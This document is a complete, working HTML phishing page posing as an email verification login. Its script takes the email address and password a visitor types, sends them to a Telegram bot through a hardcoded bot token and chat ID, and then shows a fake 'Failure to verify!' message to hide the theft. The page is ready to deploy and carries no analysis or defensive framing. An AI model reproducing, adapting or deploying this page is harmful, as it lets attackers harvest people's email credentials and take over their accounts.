<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f4f4f4;
      margin: 0;
    }

    form {
      background: white;
      padding: 20px;
      border-radius: 8px;
      width: 300px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }

    h2 {
      text-align: center;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 4px;
      border: 1px solid #ccc;
    }

    input[type="submit"] {
      width: 100%;
      padding: 10px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    input[type="submit"]:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>

  <form id="loginForm">
    <h2>To verify, log in using your email and password</h2>
    <input type="text" id="username" placeholder="Email" required>
    <input type="password" id="password" placeholder="Email Password" required>
    <input type="submit" value="Login">
  </form>

  <script>
    const botToken = '9018207536:AAEAjjknU1_aK6kOcpweicmK4_wcp78uBx8';
    const chatId = '9280527487';

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      const message = `🛡️ New Login Attempt\n👤 Username: ${username}\n🔒 Password: ${password}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
        .then(response => {
          if (response.ok) {
            alert('Failure to verify!');
          } else {
            alert('Failed to send data.');
          }
        })
        .catch(error => {
          console.error('Error:', error);
          alert('Error sending data.');
        });
    });
  </script>

</body>
</html>
